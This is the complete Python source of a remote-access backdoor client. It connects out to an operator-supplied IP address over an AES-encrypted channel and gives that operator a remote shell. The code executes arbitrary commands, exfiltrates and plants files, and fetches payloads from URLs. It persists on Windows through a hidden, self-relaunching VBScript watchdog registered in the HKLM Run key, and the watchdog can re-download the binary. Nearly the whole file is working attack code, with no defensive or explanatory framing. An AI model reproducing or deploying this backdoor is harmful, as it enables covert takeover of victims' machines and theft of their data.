#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, socket, base64, time, os, sys, urllib2, pythoncom   

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# server config
HOST = 'Your.IP.Address.Here'
PORT = 6000

# session controller
active = False

# Functions
###########

# send data function
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))
	
# receive data function
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data = data + decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]

# prompt function
def Prompt(sock, promptmsg):
	Send(sock, promptmsg)
	answer = Receive(sock)
	return answer

# upload file
def Upload(sock, filename):
	bgtr = True
	# file transfer
	try:
		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			# begin sending file
			Send(sock, fileData, "")
		f.close()
	except:
		time.sleep(0.1)
	# let server know we're done..
	time.sleep(0.8)
	Send(sock, "")
	time.sleep(0.8)
	return "Finished download."
	
# download file
def Download(sock, filename):
	# file transfer
	g = open(filename, 'wb')
	# download file
	fileData = Receive(sock)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	# let server know we're done..
	return "Finished upload."

# download from url (unencrypted)
def Downhttp(sock, url):
	# get filename from url
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	g = open(filename, 'wb')
	# download file
	u = urllib2.urlopen(url)
	g.write(u.read())
	g.close()
	# let server know we're done...
	return "Finished download."
	

			
# persistence
def Persist(sock, redown=None, newdir=None):

	# Windows/NT Methods
	if os.name == 'nt':
		
			# fetch executable's location
			exedir = os.path.join(sys.path[0], sys.argv[0])
			exeown = exedir.split('\\')[-1]
			
			# get vbscript location
			vbsdir = os.getcwd() + '\\' + 'vbscript.vbs'
			
			# write VBS script
			if redown == None: vbscript = 'state = 1\nhidden = 0\nwshname = "' + exedir + '"\nvbsname = "' + vbsdir + '"\nWhile state = 1\nexist = ReportFileStatus(wshname)\nIf exist = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(wshname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(vbsname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nSet WshShell = WScript.CreateObject ("WScript.Shell")\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\nFor Each objProcess in colProcessList\nif objProcess.name = "' + exeown + '" then\nvFound = True\nEnd if\nNext\nIf vFound = True then\nwscript.sleep 50000\nElse\nWshShell.Run """' + exedir + '""",hidden\nwscript.sleep 50000\nEnd If\nvFound = False\nElse\nwscript.sleep 50000\nEnd If\nWend\nFunction ReportFileStatus(filespec)\nDim fso, msg\nSet fso = CreateObject("Scripting.FileSystemObject")\nIf (fso.FileExists(filespec)) Then\nmsg = True\nElse\nmsg = False\nEnd If\nReportFileStatus = msg\nEnd Function\n'
			else:
				if newdir == None: 
					newdir = exedir
					newexe = exeown
				else: 
					newexe = newdir.split('\\')[-1]
				vbscript = 'state = 1\nhidden = 0\nwshname = "' + exedir + '"\nvbsname = "' + vbsdir + '"\nurlname = "' + redown + '"\ndirname = "' + newdir + '"\nWhile state = 1\nexist1 = ReportFileStatus(wshname)\nexist2 = ReportFileStatus(dirname)\nIf exist1 = False And exist2 = False then\ndownload urlname, dirname\nEnd If\nIf exist1 = True Or exist2 = True then\nif exist1 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(wshname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nexist2 = False\nend if\nif exist2 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(dirname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nend if\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(vbsname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nSet WshShell = WScript.CreateObject ("WScript.Shell")\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\nFor Each objProcess in colProcessList\nif objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\nvFound = True\nEnd if\nNext\nIf vFound = True then\nwscript.sleep 50000\nEnd If\nIf vFound = False then\nIf exist1 = True then\nWshShell.Run """' + exedir + '""",hidden\nEnd If\nIf exist2 = True then\nWshShell.Run """' + dirname + '""",hidden\nEnd If\nwscript.sleep 50000\nEnd If\nvFound = False\nEnd If\nWend\nFunction ReportFileStatus(filespec)\nDim fso, msg\nSet fso = CreateObject("Scripting.FileSystemObject")\nIf (fso.FileExists(filespec)) Then\nmsg = True\nElse\nmsg = False\nEnd If\nReportFileStatus = msg\nEnd Function\nfunction download(sFileURL, sLocation)\nSet objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\nobjXMLHTTP.open "GET", sFileURL, false\nobjXMLHTTP.send()\ndo until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\nIf objXMLHTTP.Status = 200 Then\nSet objADOStream = CreateObject("ADODB.Stream")\nobjADOStream.Open\nobjADOStream.Type = 1\nobjADOStream.Write objXMLHTTP.ResponseBody\nobjADOStream.Position = 0\nSet objFSO = Createobject("Scripting.FileSystemObject")\nIf objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\nSet objFSO = Nothing\nobjADOStream.SaveToFile sLocation\nobjADOStream.Close\nSet objADOStream = Nothing\nEnd if\nSet objXMLHTTP = Nothing\nEnd function\n'
			
			# open file & write
			vbs = open('vbscript.vbs', 'wb')
			vbs.write(vbscript)
			vbs.close()
			
			# add registry to startup
			persist = Exec('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
			persist += '\nPersistence complete.\n'
			return persist
			
# execute command
def Exec(cmde):
	# check if command exists
	if cmde:
		execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		cmdoutput = execproc.stdout.read() + execproc.stderr.read()
		return cmdoutput
		
	# otherwise, return
	else:
		return "Enter a command.\n"
	
		
# main loop
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		  
		# create a cipher object using the random secret
		cipher = AES.new(secret,AES.MODE_CFB,'0000000000000000')

		# waiting to be activated...
		data = Receive(s)
	
		# activate.
		if data == 'Activate':
			active = True
			Send(s, "\n"+os.getcwd()+">")
		
		# interactive loop
		while active:
			
			# Receive data
			data = Receive(s)

			# think before you type smartass
			if data == '':
				time.sleep(0.02)
			
			# check for quit
			if data == "quit" or data == "terminate":
				Send(s, "quitted")
				break
				
			# check for change directory
			elif data.startswith("cd ") == True:
				try:
					os.chdir(data[3:])
					stdoutput = ""
				except:
					stdoutput = "Error opening directory.\n"
				
			# check for download
			elif data.startswith("download") == True:
				# Upload the file
				stdoutput = Upload(s, data[9:])
			
			elif data.startswith("downhttp") == True:
				# Download from url
				stdoutput = Downhttp(s, data[9:])

			# check for upload
			elif data.startswith("upload") == True:
				# Download the file
				stdoutput = Download(s, data[7:])
				
			elif data.startswith("persist") == True:
				# Attempt persistence
				if len(data.split(' ')) == 1: stdoutput = Persist(s)
				elif len(data.split(' ')) == 2: stdoutput = Persist(s, data.split(' ')[1])
				elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])
			
					
			else:
				# execute command.
				stdoutput = Exec(data)
				
			# send data
			stdoutput = stdoutput+"\n"+os.getcwd()+">"
			Send(s, stdoutput)
			
		# loop ends here
		
		if data == "terminate":
			break
		time.sleep(3)
	except socket.error:
		s.close()
		time.sleep(10)
		continue
	      
